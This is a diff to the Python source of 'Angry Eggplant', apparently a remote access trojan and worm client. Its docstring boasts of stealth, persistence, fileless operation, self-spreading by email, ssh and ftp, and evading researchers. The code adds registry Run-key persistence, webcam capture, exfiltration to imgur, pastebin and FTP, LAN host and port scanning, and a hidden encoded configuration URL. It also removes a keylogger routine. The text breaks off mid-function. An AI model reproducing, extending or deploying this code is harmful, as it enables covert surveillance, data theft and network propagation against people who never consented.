@@ -21,7 +21,31 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
+"""
+ 
+ 
+        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
+        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
+        ,adPPPPP88 88       88 8b       88 88	        8b       88
+        88,    ,88 88       88 "8a,   ,d88 88	        "8a,   ,d88
+        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
+                                aa,    ,88 	         aa,    ,88
+                                 "Y8bbdP"                 "Y8bbdP'
 
+                                                       88                          ,d
+                                                       88                          88
+         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
+        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
+        8PP8888888 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
+        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
+         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
+                    aa,    ,88  aa,    ,88 88                                      "Y888
+                     "Y8bbdP"    "Y8bbdP"  88
+
+
+
+                            https://github.com/colental/ae
+"""
 
 from __future__ import print_function
 
@@ -73,83 +97,73 @@ class Client():
 
     """
 
-     Is it possible to build an ultra-portable, stealthy and persistent worm which
-     self-replicates by infecting host machines with the purpose of building a
-     peer-to-peer botnet that is written in pure python, has zero dependencies,
-     runs on anything, requires no manual configuration, automates host discovery, 
-     and autonomously discovers and analyzes hosts to then generate, configure,
-     and compile a unique encrypted deliverable for each target, utilizing mulitiple
-     attack vectors for payload delivery, to gain a foothold, establish persistence,
-     while minimizing potential exposure of peers in the botnet - while all network
-     communication is encrypted end-to-end with state of the art cryptography?
+    THE ANGRY EGGPLANT PROJECT
+
+         Angry Eggplant primarily acts as a remote access tool inspired by the
+         Meterpreter shell of the Metasploit Project, with some major improvements.
+         It is ultra-portable - it is written in pure python, has zero dependencies,
+         runs on anything, requires no manual configuration, and does not require
+         any downloads or installations to run - in fact, if it can't find something
+         it needs, rather than raise an error or fail to run, it automatically
+         downloads/installs it silently without any user interaction. This is
+         convenient for the remote access tool, but the true power of this is in
+         the autonomous mode which transforms the client from a reverse tcp shell
+         loaded with many payloads into something more closely resembling a worm
+         than a remote access tool. Operating in this mode it autonomously discovers
+         and analyzes hosts to then generate, configure, and compile a unique
+         encrypted deliverable for each target which acts as a stager that gains a
+         foothold and acts a stager from which to download and execute the main client
+         from. The client first establishes persistence with multiple methods to ensure
+         redundancy. Next it seeks to discover new host machines in its local network,
+         and spread itstelf to those hosts using mulitiple payload delivery vectors,
+         such as email, ssh, and ftp. It does all this from memory without leaving a
+         trace of evidence on the host machine's hard disk. It never connects to a
+         command & control server or exposes the attacker in any way - rather it only
+         will make connections with the machine that infected it and with any machines
+         it subsequently infects. Finally, and most importantly, all communication over
+         any network is encrypted from end-to-end with secure modern cryptography,
+         thus minimizing the amount of information exposed to potential discovery by
+         security researchers.
+
      
-     The Angry Eggplant project proposes the following solution:
+        Client Features:
 
- 
- 
-        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
-        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
-        ,adPPPPP88 88       88 8b       88 88	        8b       88
-        88,    ,88 88       88 "8a,   ,d88 88	        "8a,   ,d88
-        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
-                                aa,    ,88 	         aa,    ,88
-                                 "Y8bbdP"                 "Y8bbdP'
+            - 26 payloads
 
-                                                       88                          ,d
-                                                       88                          88
-         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
-        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
-        8PP8888888 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
-        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
-         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
-                    aa,    ,88  aa,    ,88 88                                      "Y888
-                     "Y8bbdP"    "Y8bbdP"  88
+            - End-to-end encryption
 
+            - Runs on Windows, Mac OS X, iOS, Linux (Android support coming soon)
 
+            _ Automated host discovery
 
-                            https://github.com/colental/ae
-    Features:
+            - Multiple delivery vectors - email, ssh, ftp, social media, torrents, websites
 
-        - 26 payloads
+            - No dependencies 
 
-        - End-to-end encryption
+            - No configuration
 
-        - Runs on Windows, Mac OS X, iOS, Linux, Android
+            - Pure python source
 
-        _ Automated host discovery
+            - Compiles source into native executable format for each host
 
-        - Multiple delivery vectors - email, ssh, ftp, social media, torrents, websites
-
-        - No dependencies 
-
-        - No configuration
-
-        - Pure python source
-
-        - Compiles source into native executable format for each host
+            - Operates autonomously
 
 
     """
 
-    # Class Attributes
-
 
     debug       = True
     abort       = False
-    _jobs       = {}
-    _network    = {}
+    _ransom     = list([])
+    _results    = dict({})
+    _network    = dict({})
+    _jobs       = dict({})
     _queue      = Queue.Queue()
     _session    = {'socket': None, 'key': None, 'connection': threading.Event()}
     __name__    = 'Client'
 
 
-    # Private Methods
-
-
     def __init__(self, **kwargs):
-        """
-        create a new instance of the client handler
-        """
         self._kwargs    = kwargs
         self._info      = Client._get_info()
         self._services  = Client._get_services()
@@ -172,59 +186,16 @@ class Client():
                     Client._debug("{} returned error: {}".format(Client._configure.func_name, str(e)))
 
     @staticmethod
-    def _post(url, headers={}, data={}):
-        dat = urllib.urlencode(data)
-        req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
-        for key, value in headers.items():
-            req.headers[key] = value
-        return urllib2.urlopen(req).read()
-
-
-    @staticmethod
-    def _ping(host):
-        try:
-            if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
-                self._network[host] = {'ports': {}} if host not in self._network else self._network.get(host)
-                return True
-            else:
-                return False
-        except Exception as e:
-            Client._debug("{} returned error: {}".format(Client._ping.func_name, str(e)))
-            return False
-
-
-    @staticmethod
-    def _threader():
-        while True:
-            try:
-                worker, task = self._queue.get_nowait()
-                getattr(self, worker)(task)
-                self._queue.task_done()
-            except:
-                break
-
-
-    @staticmethod
     def _obfuscate(data):
         a = bytearray(reversed(data))
         b = Client._get_nth_prime(len(a) + 1)
-        return base64.b64encode("".join([(chr(a.pop()) if i in Client._get_primes(b) else os.urandom(1)) for i in xrange(b)]))
+        c = Client._get_primes(b)
+        return base64.b64encode("".join([(chr(a.pop()) if n in c else os.urandom(1)) for n in xrange(b)]))
 
 
     @staticmethod
     def _deobfuscate(block):
         return bytes().join(chr(bytearray(base64.b64decode(block))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(block)))))
-
-
-    @staticmethod
-    def _encrypt(data):
-        return Client._encrypt_aes(data, Client._deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._encrypt_xor(data, Client._deobfuscate(Client._session['key']))
-
-
-
-    @staticmethod
-    def _decrypt(data):
-        return Client._decrypt_aes(data, Client._deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._decrypt_xor(data, Client._deobfuscate(Client._session['key']))
 
 
     @staticmethod
@@ -236,11 +207,12 @@ class Client():
 
 
     @staticmethod
-    def _get_padded(s, block_size):
+    def _get_padded(s, block_size, padding='\x00'):
         try:
-            return bytes(s) + (block_size - len(bytes(s)) % block_size) * '\x00'
+            return bytes(s) + (block_size - len(bytes(s)) % block_size) * padding
         except Exception as e:
             Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
+
 
     @staticmethod
     def _get_blocks(s, block_size):
@@ -265,6 +237,7 @@ class Client():
             return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
         except Exception as e:
             Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))      
+
 
     @staticmethod
     def _get_connection(x, y):
@@ -309,17 +282,26 @@ class Client():
     @staticmethod
     def _get_local_ip():
         try:
-            socket.gethostbyname(socket.gethostname())
+            return socket.gethostbyname(socket.gethostname())
         except Exception as e:
             Client._debug("{} returned error: {}".format(Client._get_local_ip.func_name, str(e)))
 
-            
+
+    @staticmethod
+    def _get_task(task, result):
+        try:
+            task_id = SHA256.new(SHA256.new(str(self._info['ip'] + self._info['mac'])).hexdigest() + str(task) + str(int(time.time()))).hexdigest()
+            self._results.update({time.ctime(): {"task_id": task_id, "client": self._session['id'], "task": task, "data": str(result)}})
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._get_task.func_name, str(e)))
+
+
     @staticmethod                
     def _get_info():
         try:
             return {k:v for k,v in zip(['ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'encryption', 'device'], [Client._get_public_ip(), Client._get_local_ip(), sys.platform, ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper(), int(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), bytes('AES' if 'AES' in globals() else 'XOR'), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
         except Exception as e:
-            Client._debug(str(e))
+            Client._debug("{} returned error: {}".format(Client._get_info.func_name, str(e)))
 
 
     @staticmethod
@@ -327,57 +309,50 @@ class Client():
         try:
             return {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
         except Exception as e:
-            Client._debug(str(e))
+            Client._debug("{} returned error: {}".format(Client._get_services.func_name, str(e)))
 
 
     @staticmethod            
     def _get_status(c):
-        try: 
+        try:
+            c = time.time() - float(c)
             data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                   '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                   '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                   '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
             return ', '.join([i for i in data if i])
         except Exception as e:
-            Client._debug(str(e))
-
+            Client._debug("{} returned error: {}".format(Client._get_status.func_name, str(e)))
+           
 
     @staticmethod
-    def _get_usage(function):
-        if hasattr(function, 'usage'):
-            return "usage: %s" % getattr(function, 'usage')
-            
-
-    @classmethod
-    def _get_port(self, addr):
+    def _get_registry_key(key_name, key_value, system=False):
         try:
-            host = addr[0]
-            port = addr[1]
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1.0)
-            sock.connect((host,int(port)))
-            data = sock.recv(1024)
-            if data:
-                data = ' '.join(i for i in data if i in (chr(i) for i in range(32, 123)))
-                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': data.splitlines()[0] if '\n' in data else data[:50], 'state': 'open'}}
-            else:
-                info = {port: {'protocol': self._services.get(str(port))[0] if str(port) in self._services else ('mysql' if int(port) == 3306 else 'N/A'), 'service': self._services.get(str(port))[1] if str(port) in self._services else 'n/a', 'state': 'open'}}
-            self._network.get(host).get('ports').update(info)
-        except (socket.error, socket.timeout):
-            pass
+            key_name, key_value = [str(key_name), str(key_value)]
+            run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+            reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
+            SetValueEx(reg_key, key_name, 0, REG_SZ, key_value)
+            CloseKey(reg_key)
+            if system:
+                run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
+                SetValueEx(reg_key, '*' + key_name, 0, REG_SZ, key_value)
+                CloseKey(reg_key)
+            return True
         except Exception as e:
-            self._debug('{} error: {}'.format(self._get_port.func_name.title(), str(e)))
-
+            Client._debug("{} returned error: {}".format(str(e)))
+        return False
+            
 
     @staticmethod
     def _get_png(image):
-        if type(image) == numpy.ndarray:
-            width, height = (image.shape[1], image.shape[0])
-            data = image.tobytes()
-        else:
-            width, height = (image.width, image.height)
-            data = image.rgb
         try:
+            if type(image) == numpy.ndarray:
+                width, height = (image.shape[1], image.shape[0])
+                data = image.tobytes()
+            else:
+                width, height = (image.width, image.height)
+                data = image.rgb
             line = width * 3
             png_filter = struct.pack('>B', 0)
             scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
@@ -400,188 +375,192 @@ class Client():
             fileh.seek(0)
             return fileh
         except Exception as e:
-           Client._debug(str(e))
+            Client._debug("{} returned error: {}".format(Client._get_png.func_name, str(e)))
 
 
-    def _get_event(self, event):
+    @staticmethod
+    def _get_data(source):
         try:
-
-            if event.WindowName != vars(self.keylogger)['window']:
-                vars(self.keylogger)['window'] = event.WindowName
-                self.keylogger.buffer.write("\n[{}]\n".format(vars(self.keylogger)['window']))
-
-            if event.Ascii > 32 and event.Ascii < 127:
-                self.keylogger.buffer.write(chr(event.Ascii))
-            elif event.Ascii == 32:
-                self.keylogger.buffer.write(' ')
-            elif event.Ascii in (10,13):
-                self.keylogger.buffer.write('\n')
-            elif event.Ascii == 8:
-                self.keylogger.buffer.seek(-1, 1)
-                self.keylogger.buffer.truncate()
+            if os.path.isfile(str(source)):
+                return open(source, 'rb').read()
+            elif hasattr(source, 'getvalue'):
+                return source.getvalue()
+            elif hasattr(source, 'read'):
+                if hasattr(source, 'seek'):
+                    source.seek(0)
+                return source.read()
             else:
-                pass
-        except Exception as e:
-            self._debug('{} error: {}'.format(self._get_event.title(), str(e)))
-        return True
+                return bytes(source)
+        except Exception as e2:
+            Client._debug("{} returned error: {}".format(Client._upload_imgur.func_name, str(e2)))
 
 
-    def _get_address(self):
-        if hasattr(self, '__a__') and hasattr(self, '__b__'):
+    @staticmethod
+    def _get_worker():
+        while True:
             try:
-                a = self._get_config(long(self.__a__))
-                b = self._get_config(long(self.__b__))
-                c = urllib2.Request(a)
-                c.headers = {'API-Key': b}
-                d = urllib2.urlopen(c).read()
-                e = json.loads(d)
-                f = e[e.keys()[0]][0].get('ip')
-                if self._get_ipv4_address(f):
-                    return f
-                else:
-                    self._debug("{} returned invalid IPv4 address: '{}'\ndefaulting to localhost".format(self._get_address.func_name, str(f)))
-                    return socket.gethostbyname(socket.gethostname())
-            except Exception as e2:
-                self._debug("{} returned error: {}".format(self._get_address.func_name, str(e2)))
-        return socket.gethostbyname(socket.gethostname())
+                method, task = Client._queue.get_nowait()
+                method(task)
+                Client._queue.task_done()
+            except Exception as e:
+                break
 
 
     @staticmethod
-    @config(platforms=['win32','linux2','darwin'], api_key=None)
-    def _upload_imgur(source):
-        if hasattr(source, 'getvalue'):
-            data = source.getvalue()
-        elif hasattr(source, 'read'):
-            if hasattr(source, 'seek'):
-                source.seek(0)
-            data = source.read()
-        else:
-            data = bytes(source)
-        return json.loads(Client._post('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('data').get('link')
+    def _encrypt(data):
+        return Client._encrypt_aes(data, Client._deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._encrypt_xor(data, Client._deobfuscate(Client._session['key']))
 
 
     @staticmethod
-    @config(platforms=['win32','linux2','darwin'], api_dev_key=None, api_user_key=None)
-    def _upload_pastebin(source):
-        if hasattr(source, 'getvalue'):
-            text = source.getvalue()
-        elif hasattr(source, 'read'):
-            if hasattr(source, 'seek'):
-                source.seek(0)
-            text = source.read()
-        else:
-            text = bytes(source)
-        try:
-            info = {'api_option': 'paste', 'api_paste_code': text}
-            info.update({'api_user_key': Client._upload_pastebin.api_user_key}) if hasattr(Client._upload_pastebin, 'api_user_key') else None
-            info.update({'api_dev_key' : Client._upload_pastebin.api_dev_key}) if hasattr(Client._upload_pastebin, 'api_dev_key') else None
-            paste = Client._post('https://pastebin.com/api/api_post.php', data=info)
-            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
-        except Exception as e:
-            Client._debug('{} error: {}'.format(Client._upload_pastebin.func_name.title(), str(e)))
-
-
-    @staticmethod
-    @config(platforms=['win32','linux2','darwin'], hostname=None, username=None, password=None)
-    def _upload_ftp(source):
-        addr    = urllib.urlopen('http://api.ipify.org').read()
-        host    = ftplib.FTP(Client._upload_ftp.hostname, Client._upload_ftp.username, Client._upload_ftp.password)
-        if addr not in host.nlst('/htdocs'):
-            host.mkd('/htdocs/{}'.format(addr))
-        local   = time.ctime().split()
-        ext     = os.path.splitext(source)[1] if os.path.isfile(str(source)) else '.txt'
-        result  = '/htdocs/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], ext))
-        source  = open(source, 'rb') if os.path.isfile(str(source)) else source
-        upload  = host.storbinary('STOR ' + result, source)
-        return result
+    def _decrypt(data):
+        return Client._decrypt_aes(data, Client._deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._decrypt_xor(data, Client._deobfuscate(Client._session['key']))
 
 
     @staticmethod
     @config(block_size=8, key_size=16, num_rounds=32)
     def _encrypt_xor(data, key):
-        data    = Client._get_padded(data, Client._encrypt_xor.block_size)
-        blocks  = Client._get_blocks(data, Client._encrypt_xor.block_size)
-        vector  = os.urandom(8)
-        result  = [vector]
-        for block in blocks:
-            block   = Client._get_xor(vector, block)
-            v0, v1  = struct.unpack("!2L", block)
-            k       = struct.unpack("!4L", key[:Client._encrypt_xor.key_size])
-            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
-            for round in range(Client._encrypt_xor.num_rounds):
-                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-                sum = (sum + delta) & mask
-                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-            output  = vector = struct.pack("!2L", v0, v1)
-            result.append(output)
-        return base64.b64encode(b"".join(result))
+        try:
+            data    = Client._get_padded(data, Client._encrypt_xor.block_size)
+            blocks  = Client._get_blocks(data, Client._encrypt_xor.block_size)
+            vector  = os.urandom(8)
+            result  = [vector]
+            for block in blocks:
+                block   = Client._get_xor(vector, block)
+                v0, v1  = struct.unpack("!2L", block)
+                k       = struct.unpack("!4L", key[:Client._encrypt_xor.key_size])
+                sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
+                for round in range(Client._encrypt_xor.num_rounds):
+                    v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
+                    sum = (sum + delta) & mask
+                    v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
+                output  = vector = struct.pack("!2L", v0, v1)
+                result.append(output)
+            return base64.b64encode(b"".join(result))
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._encrypt_xor.func_name, str(e)))
 
 
     @staticmethod
     @config(block_size=8, key_size=16, num_rounds=32)
     def _decrypt_xor(data, key):
-        data    = base64.b64decode(data)
-        blocks  = Client._get_blocks(data, Client._decrypt_xor.block_size)
-        vector  = blocks[0]
-        result  = []
-        for block in blocks[1:]:
-            v0, v1 = struct.unpack("!2L", block)
-            k = struct.unpack("!4L", key[:Client._decrypt_xor.key_size])
-            delta, mask = 0x9e3779b9L, 0xffffffffL
-            sum = (delta * Client._decrypt_xor.num_rounds) & mask
-            for round in range(Client._decrypt_xor.num_rounds):
-                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-                sum = (sum - delta) & mask
-                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-            decode = struct.pack("!2L", v0, v1)
-            output = Client._get_xor(vector, decode)
-            vector = block
-            result.append(output)
-        return "".join(result).rstrip('\x00')
+        try:
+            data    = base64.b64decode(data)
+            blocks  = Client._get_blocks(data, Client._decrypt_xor.block_size)
+            vector  = blocks[0]
+            result  = []
+            for block in blocks[1:]:
+                v0, v1 = struct.unpack("!2L", block)
+                k = struct.unpack("!4L", key[:Client._decrypt_xor.key_size])
+                delta, mask = 0x9e3779b9L, 0xffffffffL
+                sum = (delta * Client._decrypt_xor.num_rounds) & mask
+                for round in range(Client._decrypt_xor.num_rounds):
+                    v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
+                    sum = (sum - delta) & mask
+                    v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
+                decode = struct.pack("!2L", v0, v1)
+                output = Client._get_xor(vector, decode)
+                vector = block
+                result.append(output)
+            return "".join(result).rstrip('\x00')
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._decrypt_xor.func_name, str(e)))
 
 
     @staticmethod
     def _encrypt_aes(plaintext, key):
-        text        = Client._get_padded(plaintext, AES.block_size)
-        iv          = os.urandom(AES.block_size)
-        cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
-        ciphertext  = iv + cipher.encrypt(text)
-        hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
-        output      = base64.b64encode(ciphertext + hmac_sha256)
-        return output
+        try:
+            text        = Client._get_padded(plaintext, AES.block_size)
+            iv          = os.urandom(AES.block_size)
+            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
+            ciphertext  = iv + cipher.encrypt(text)
+            hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
+            output      = base64.b64encode(ciphertext + hmac_sha256)
+            return output
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._encrypt_aes.func_name, str(e)))
 
 
     @staticmethod
     def _decrypt_aes(ciphertext, key):
-        ciphertext  = base64.b64decode(ciphertext)
-        iv          = ciphertext[:AES.block_size]
-        cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
-        read_hmac   = ciphertext[-SHA256.digest_size:]
-        calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
-        output      = cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(b'\0')
-        Client._debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
-        return output
+        try:
+            ciphertext  = base64.b64decode(ciphertext)
+            iv          = ciphertext[:AES.block_size]
+            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
+            read_hmac   = ciphertext[-SHA256.digest_size:]
+            calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
+            output      = cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(b'\0')
+            Client._debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
+            return output
+        except Exception as e:
+            Client._debug("{} returned error: {}".format(Client._decrypt_aes.func_name, str(e)))
 
 
-    @config(platforms=['win32','linux2','darwin']) 
+    @staticmethod
+    @config(api_key=None)
+    def _upload_imgur(source):
+        try:
+            data = Client._get_data(source)
+            return json.loads(Client._post('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('data').get('link')
+        except Exception as e2:
+            Client._debug("{} returned error: {}".format(Client._upload_imgur.func_name, str(e2)))
+
+
+    @staticmethod
+    @config(api_dev_key=None, api_user_key=None)
+    def _upload_pastebin(source):
+        try:
+            data = Client._get_data(source)
+            info = {'api_option': 'paste', 'api_paste_code': data}
+            info.update({'api_user_key': Client._upload_pastebin.api_user_key}) if hasattr(Client._upload_pastebin, 'api_user_key') else None
+            info.update({'api_dev_key' : Client._upload_pastebin.api_dev_key}) if hasattr(Client._upload_pastebin, 'api_dev_key') else None
+            paste = Client._post('https://pastebin.com/api/api_post.php', data=info)
+            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
+        except Exception as e:
+            Client._debug('{} error: {}'.format(Client._upload_pastebin.func_name, str(e)))
+
+
+    @staticmethod
+    @config(hostname=None, username=None, password=None)
+    def _upload_ftp(source):
+        try:
+            if os.path.isfile(str(source)):
+                source = open(source, 'rb')
+            elif hasattr(source, 'seek'):
+                source.seek(0)
+            else:
+                source = cStringIO.StringIO(bytes(source))
+            addr    = urllib.urlopen('http://api.ipify.org').read()
+            host    = ftplib.FTP(Client._upload_ftp.hostname, Client._upload_ftp.username, Client._upload_ftp.password)
+            if addr not in host.nlst('/htdocs'):
+                host.mkd('/htdocs/{}'.format(addr))
+            local   = time.ctime().split()
+            ext     = os.path.splitext(source)[1] if os.path.isfile(str(source)) else '.txt'
+            result  = '/htdocs/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], ext))
+            upload  = host.storbinary('STOR ' + result, source)
+            return result
+        except Exception as e2:
+            self._debug("{} returned error: {}".format(Client._upload_ftp.func_name, str(e2)))
+
+
     def _scan_host(self, host):
         try:
-            for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8443,8888]:
-                self._queue.put_nowait((self._get_port, (host, port)))
-            for x in xrange(10):
-                self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
-                self._jobs['scanner-%d' % x].daemon = True
-                self._jobs['scanner-%d' % x].start()
-            for x in xrange(10):
-                if self._jobs['scanner-%d' % x].is_alive():
-                    self._jobs['scanner-%d' % x].join()
-            return json.dumps(self.network)
+            if self._ping(host):
+                for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8443,8888]:
+                    self._queue.put_nowait((self._port, (host, port)))
+                for x in xrange(10):
+                    self._jobs['scanner-%d' % x] = threading.Thread(target=self._get_worker, name=time.time())
+                    self._jobs['scanner-%d' % x].daemon = True
+                    self._jobs['scanner-%d' % x].start()
+                for x in xrange(10):
+                    if self._jobs['scanner-%d' % x].is_alive():
+                        self._jobs['scanner-%d' % x].join()
+            return json.dumps(self._network)
         except Exception as e:
-            self._debug('{} error: {}'.format(self.scan_ports.func_name.title(), str(e)))
+            self._debug('{} error: {}'.format(self._scan_host.func_name, str(e)))
+            return '{} error: {}'.format(self._scan_host.func_name, str(e))
 
 
-    @config(platforms=['win32','linux2','darwin']) 
-    def _scan_network(self):
+    def _scan_network(self, *args):
         try:
             stub = '.'.join(str(self._info['local']).split('.')[:-1]) + '.%d'
             lan  = []
@@ -590,106 +569,133 @@ class Client():
                 self._queue.put_nowait((self._ping, stub % i))
             for _ in xrange(10):
                 x = len(self._jobs)
-                self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
+                self._jobs['scanner-%d' % x] = threading.Thread(target=self._get_worker, name=time.time())
                 self._jobs['scanner-%d' % x].setDaemon(True)
                 self._jobs['scanner-%d' % x].start()
             self._jobs['scanner-%d' % x].join()
             for ip in lan:
-                self._queue.put_nowait((self.scan_ports, ip))
+                self._queue.put_nowait((self._scan_host, ip))
             for n in xrange(len(lan)):
                 x = len(self._jobs)
-                self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
+                self._jobs['scanner-%d' % x] = threading.Thread(target=self._get_worker, name=time.time())
                 self._jobs['scanner-%d' % x].start()
             self._jobs['scanner-%d' % x].join()
             return json.dumps(self._network)
         except Exception as e:
-            self._debug('{} error: {}'.format(self.scan_network.func_name.title(), str(e)))
+            self._debug('{} error: {}'.format(self._scan_network.func_name, str(e)))
+            return '{} error: {}'.format(self._scan_network.func_name, str(e))
 
-
-    @config(platforms=['win32','linux2','darwin'])
-    def _keylogger(self, *args, **kwargs):
-        while True:
-            try:
-                hm = HookManager()
-                hm.KeyDown = self._get_event
-                hm.HookKeyboard()
-                if os.name is 'nt':
-                    PumpMessages()
-                else:
-                    time.sleep(0.1)
-            except Exception as e:
-                self._debug('{} error: {}'.format(self.keylogger, str(e)))
-                break
-
-
-    @config(platforms=['win32','linux2','darwin'])
+           
     def _webcam_image(self, *args, **kwargs):
-        dev = VideoCapture(0)
-        r,f = dev.read()
-        dev.release()
-        if not r:
-            return "Unable to access webcam"
-        png = self._get_png(f)
-        return self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png)
+        try:
+            dev = VideoCapture(0)
+            r,f = dev.read()
+            dev.release()
+            if not r:
+                return "Unable to access webcam"
+            png = self._get_png(f)
+            return self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png)
+        except Exception as e:
+            self._debug('{} error: {}'.format(self._webcam_image.func_name, str(e)))
 
             
-    @config(platforms=['win32','linux2','darwin'])
-    def _webcam_video(self, duration=5.0, *args, **kwargs):
